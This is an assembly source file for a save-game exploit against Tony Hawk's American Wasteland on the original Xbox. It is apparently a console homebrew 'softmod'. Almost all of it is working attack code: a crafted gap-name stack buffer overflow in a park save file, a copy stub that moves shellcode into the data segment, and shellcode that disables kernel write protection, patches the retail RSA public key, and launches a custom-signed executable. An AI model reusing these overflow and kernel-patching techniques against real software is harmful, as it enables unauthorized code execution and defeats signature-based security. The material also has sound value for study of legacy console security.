; Description: Save game exploit for Tony Hawk's American Wasteland (NTSC)
; Author: Grimdoomer

        BITS 32

; Constants
%define GapDataStartFileOffset          0E04h       ; Offset of the gap data in the save file
%define ParkFileHeaderAddress           00462EF8h   ; Address of where the first 136 bytes of the park file get put on to the data segment
%define DataSegmentShellCodeAddress     0039AE80h   ; Data segment address we write the shell code to

%define ShellCodeSize               (_shell_code_end - _shell_code_start)   ; Size of the shell code data

;-------------------------------------------------------------------------------------------------------------------
;                                           Explanation of the hack
;-------------------------------------------------------------------------------------------------------------------
; This hack uses the same gap name buffer overflow that is present in most Tony Hawk games. This one is
; similar to THPS4 but uses a slightly different copy stub to ensure we don't depend on any memory addresses
; for data on the heap. Unlike the other Tony Hawk games the heap memory addresses for American Wasteland will
; vary wildly depending on the console type (dev or retail), if the game is run from the HDD or disc, and how
; many other save files are on the console. To make the exploit as reliable as possible I eliminated the need
; for any hard coded heap memory addresses.
;
; The order of operations is as follows:
;
;   1. The custom park file is loaded and the gap names are processed. When the first gap name is processed we
;       overflow the stack and overwrite the return address to point to a region of the data segment where the first
;       136 bytes of the park file are stored. This is where I put the copy stub shell code.
;
;   2. Once the save loading function returns we will jump to the copy shell code stub which copies the main
;       shell code payload to the data segment which is executable, and jumps to it.
;
;   3. The main shell code payload will do the normal patching of the kernel to use the 
;       habibi RSA keypair and load a custom signed xbe file from the save folder.
;
;-------------------------------------------------------------------------------------------------------------------

;---------------------------------------------------------
; Shell code Copier: copies the main shell code from the heap to the data segment
;---------------------------------------------------------
dd      0x24
dd      (_shellcode_copy_end - _shellcode_copy_start)

_shellcode_copy_start:
        
        ; ebp = address of heap allocation containing save game context, adjust pointer
        ; to point to _copy_stub_data.
        lea     esp, [ebp+14A2Eh+(_copy_stub_data - _gap_data_start)]
        
        ; Setup for shell code copy. Note: I pop the same data segment address twice because we have limited space
        ; for this copy stub and a pop instruction uses 1 less byte than a move instruction.
        pop     eax             ; Data segment address to jump to
        pop     edi             ; Data segment address to copy shell code to
        pop     ecx             ; Size of the shell code data to copy
        mov     esi, esp        ; Pointer to shell code data to copy
        
        ; Copy shell code to the data segment.
        rep movsb
        
        ; Jump to the main shell code payload.
        call    eax

_shellcode_copy_end:

;---------------------------------------------------------
; Gap name stack overflow
;---------------------------------------------------------
dd      GapDataStartFileOffset
dd      (_gap_data_end - _gap_data_start)

_gap_data_start:

        ; +0 Start of gap 1 struct.
        db  08h, 08h, 20h, 1Eh
        db  0h, 0h, 31h, 0h

_0:     ; +8 Fill the gap name buffer with crap data.
        db  "Grim R0x T0ny H4wk's S0x!"
        times 0x30 - ($ - _0) db 69h
        
        dd  ParkFileHeaderAddress + 0x24        ; return address = shell code copy stub
        
        ; null terminator
        db  0
        align 4, db 0
        
_copy_stub_data:

        dd DataSegmentShellCodeAddress                  ; eax = data segment address
        dd DataSegmentShellCodeAddress                  ; edi = data segment address
        dd ShellCodeSize                                ; ecx = shell code size

_buffer_overflow_end:

;---------------------------------------------------------
; Main exploit shellcode
;---------------------------------------------------------

; Main entry point for the payload.
_shell_code_start:
        call    base        ; Call base which will put the address of base onto the stack, which we can pop to get our base pointer.

base:
        ; Pop the address of base off the stack so we have our base pointer.
        pop     ebp

        ; Get the address of the kernel export table
        mov     esi, 80010000h      ; base kernel address
        mov     eax, [esi+3Ch]      ; offset of PE header
        mov     ebx, [esi+eax+78h]  ; offset of the exports segment
        add     ebx, esi            ; add kernel base address
        mov     edx, [ebx+1Ch]      ; offset of the exports table
        add     edx, esi            ; address of the exports table

        ; Get the address of our "import" table
        lea     edi, [ebp+krnlimports-base]

resolve_import:
        ; Load the next import index and check if it is valid
        mov     ecx, [edi]
        test    ecx, ecx
        jz      patch_rsa_check

        ; Load the function address from the export table
        sub     ecx, [ebx+10h]      ; Subtract the base export number
        mov     eax, [edx+4*ecx]    ; Load the function offset from the export table
        test    eax, eax
        jz      _empty
        add     eax, esi            ; Add the kernel base address to the function offset
_empty:
        mov     [edi], eax

        ; Next import
        add     edi, 4
        jmp     resolve_import

patch_rsa_check:
        ; Get the address of the RSA public key.
        mov     edi, [ebp+XePublicKeyData-base]     ; Address to start searching at
        test    edi, edi
        jz      patch_rsa_fail

        ; Check the last 4 bytes for the retail key.
        add     edi, 272
        cmp     dword [edi], 0A44B1BBDh
        je      patch_rsa

patch_rsa_fail:
        ; The data was never found, change the LED color and loop forever.
        push    0F0h
        mov     ecx, ebp
        add     ecx, SetLEDColor-base
        call    ecx

        ; Just loop forever.
shit_loop:
        nop
        jmp     shit_loop

patch_rsa:
        ; Disable write protect.
        pushf
        cli                         ; Disable interrupts
        mov     ecx, cr0            ; Get the control register value
        push    ecx                 ; Save it for later
        and     ecx, 0FFFEFFFFh     ; Disable write-protect
        mov     cr0, ecx

        ; Patch the RSA key to the habibi key.
        xor     dword [edi], 2DD78BD6h

        ; Re-enable write-protect.
        pop     ecx
        mov     cr0, ecx            ; Re-enable write-protect
        popf

        ; Change the LED color to signal the data was found.
        push    0FFh
        mov     ecx, ebp
        add     ecx, SetLEDColor-base
        call    ecx

launchxbe:
        ; Load the launch data page address from the kernel and check if it is valid.
        mov     esi, [ebp+LaunchDataPage-base]
        mov     edi, 1000h          ; Size of the memory region to allocate/persist
        mov     ebx, [esi]          ; Load the launch data page address
        test    ebx, ebx            ; Check if it is valid
        jnz     memok

        ; The launch data page is invalid, allocate a new buffer
        push    edi                 ; Page size to allocate
        call    dword [ebp+MmAllocateContiguousMemory-base]
        mov     ebx, eax
        mov     [esi], eax          ; Store the address into the kernel LaunchDataPage holder

memok:
        ; Make the memory persistent
        push    byte 1
        push    edi                 ; Size of memory block
        push    ebx                 ; Address of memory block
        call    dword [ebp+MmPersistContiguousMemory-base]

        ; Zero out the data block
        mov     edi, ebx
        xor     eax, eax
        mov     ecx, 400h
        rep     stosd

        ; Setup the launch data parameters
        or      dword [ebx], byte -1
        mov     [ebx+4], eax
        lea     edi, [ebx+8]        ; Address of the launch string buffer
        lea     esi, [ebp+xbestr-base]  ; Address of our nyancat xbe

        push    byte XBESTRLEN
        pop     ecx                 ; Setup the loop counter to be the length of the xbe string
        rep     movsb               ; Copy the string into the data buffer

        ; Launch the xbe
        push    byte 2
        call    dword [ebp+HalReturnToFirmware-base]

        align 4, db 0

;
; SetLEDColor(int color)
;
SetLEDColor:
        ; Initialize the stack.
        push    ebp

        ; Set LED override color.
        push    dword [esp+8]   ; color
        push    0               ; write word value
        push    8               ; command code
        push    20h             ; device address
        call    dword [ebp+HalWriteSMBusValue-base]

        ; Enabled LED override.
        push    1       ; value
        push    0       ; write word value
        push    7       ; command
        push    20h     ; slave address
        call    dword [ebp+HalWriteSMBusValue-base]

        ; Destroy the stack frame.
        pop     ebp
        retn    4

        align 4, db 0
        
krnlimports:
        HalReturnToFirmware             dd 49
        LaunchDataPage                  dd 164
        MmAllocateContiguousMemory      dd 165
        MmPersistContiguousMemory       dd 178
        XePublicKeyData                 dd 355
        HalWriteSMBusValue              dd 50
                                        dd 0

xbestr                      db '\Device\Harddisk0\Partition1\UDATA\41560049\3DDF5FA578FC;default.xbe',0
                            align 4, db 0
XBESTRLEN                   equ $-xbestr

_shell_code_end:
_gap_data_end:

;---------------------------------------------------------
; End of file
;---------------------------------------------------------
dd -1